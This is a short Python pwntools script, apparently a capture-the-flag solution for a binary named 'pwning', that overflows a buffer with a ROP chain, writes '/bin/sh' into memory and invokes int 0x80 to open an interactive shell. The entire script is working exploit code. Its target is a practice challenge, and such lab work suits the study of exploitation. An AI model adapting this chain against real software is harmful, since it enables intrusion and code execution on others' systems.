# wget https://ctf.j0n9hyun.xyz/files/a1cfa125d5bf7978de474ebc4e2a2b65/pwning
import code
import time
from pwn import *

#p = remote('ctf.j0n9hyun.xyz',3019)
p = process('./pwning')

input('attach gdb')

e = ELF('./pwning')
bss = 0x804a040
bss_8 = bss+8
int80 = 0x80484d0

print(p.recv())
p.sendline('-1')
print(p.recv())

rop = ROP(e)
rop.raw(b'a'*0x2c)
rop.raw(b'b'*0x4)
rop.call('getchar')	# test
rop.call('getchar')	# test
rop.call('getchar')	# test
rop.call('getchar')	# test
rop.call('get_n', [bss_8, 8])	# input '/bin/sh\x00'
rop.call('get_n', [bss_8+8, 2])	# input "11"
rop.call('atoi', [bss_8+8])
rop.raw(rop.ebx.address)
rop.raw(bss_8)
rop.raw(int80)

print(rop.dump())

p.sendline(rop.chain())
time.sleep(0.2)
p.sendline(b'/bin//sh')

p.interactive()
